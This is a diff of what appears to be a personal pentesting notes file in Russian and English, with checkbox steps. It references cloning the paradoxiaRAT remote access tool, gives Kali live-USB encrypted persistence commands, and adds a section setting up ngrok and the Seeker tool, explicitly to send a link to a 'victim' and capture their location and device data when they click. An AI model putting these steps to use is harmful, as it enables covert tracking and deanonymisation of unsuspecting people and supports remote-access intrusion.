@@ -99,7 +99,10 @@ ToRat
 paradoxiaRAT
     git clone https://github.com/quantumcored/paradoxiaRAT
         Paradoxia Remote Access Tool.
-        
+
+
+--- ✄ -----------------------
+
 Создаем Encrypt persistence на Live usb Kali:
             - Encrypt the partition with LUKS:
                 ☐ cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3
@@ -129,3 +132,22 @@ paradoxiaRAT
                 ☐ mount /dev/sdb4 /mnt/usb
                 ☐ echo "/ union" > /mnt/usb/persistence.conf
                 ☐ umount /mnt/usb
+
+ --- ✄ -----------------------
+ 
+SEEKER, NGROK (Кидаем  ссылку жертве для определения его местоположения):
+            Install ngrok:
+                - download ngrok - https://ngrok.com/download
+                - create account ngrok
+                ☐ unzip /path/to/ngrok.zip
+                ☐ ./ngrok authtoken <your_auth_token>
+            Install seeker:
+                ☐ git clone https://github.com/thewhiteh4t/seeker.git
+                ☐ cd seeker/
+                ☐ apt update
+                ☐ apt install python3 python3-pip php
+                ☐ pip3 install requests
+            Запускаем:
+                ☐ ./ngrok http 8080
+                ☐ ./seeker.py -t manual
+                    - полученную ссылку кидаем жертве, когда он переходи по ней, мы в терминале увидим полученные данные о нем
